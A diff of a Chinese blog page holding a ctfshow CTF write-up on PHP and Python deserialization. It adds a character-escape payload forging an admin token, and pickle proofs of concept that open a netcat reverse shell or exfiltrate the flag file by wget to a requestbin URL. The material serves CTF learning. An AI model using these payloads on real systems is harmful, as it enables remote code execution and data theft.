@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">4.7k</span>
+            <span class="post-count">4.8k</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">26 分钟</span>
+            <span class="post-count">27 分钟</span>
         </span>
     </span>
 </div>
@@ -156,6 +156,10 @@
 <p>看到条件是需要 token=admin才行 需要字符逃逸</p>
 <p>exp:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$umsg</span>);</span><br></pre></td></tr></table></figure>
+<p>get传参</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&#x3D;1&amp;m&#x3D;1&amp;t&#x3D;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>进入message.php</p>
+<p>增加 cookie  msg 为 base64后的payload</p>
 <h2 id="web263"><a class="header-anchor" href="#web263">¶</a>web263</h2>
 <p>www.zip 发现源码</p>
 <p>看到利用点</p>
@@ -255,6 +259,9 @@ payload</p>
 <p>这题肯定是python反序列化了</p>
 <p>poc</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">		<span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;nc xxx.xxx.xxx.xxx 4567 -e /bin/sh&quot;).read()&#x27;</span>,))</span><br><span class="line">a=A()</span><br><span class="line">test=pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(test))</span><br></pre></td></tr></table></figure>
+<p>有点坑哈 特意问了问群主 这题目里没nc了。。。。。</p>
+<p>用下面的这种外带吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class CTFshow():</span><br><span class="line">	def sw(<span class="built_in">self</span>):</span><br><span class="line">		<span class="keyword">print</span>(<span class="built_in">self</span>.show)</span><br><span class="line">	def __init__(<span class="built_in">self</span>,show):</span><br><span class="line">		<span class="built_in">self</span>.show = show</span><br><span class="line">	def __reduce__(<span class="built_in">self</span>):</span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;wget http://requestbin.net/r/1wl2ukps?a=`cat fla*`&#x27;).read()&quot;</span>,))</span><br><span class="line">cs = CTFshow(<span class="string">&quot;https://ctf.show&quot;</span>)</span><br><span class="line">ctfshow_ser = pickle.dumps(cs)</span><br><span class="line"><span class="keyword">print</span>(base64.b64encode(ctfshow_ser))</span><br></pre></td></tr></table></figure>
  
       <!-- reward -->
       
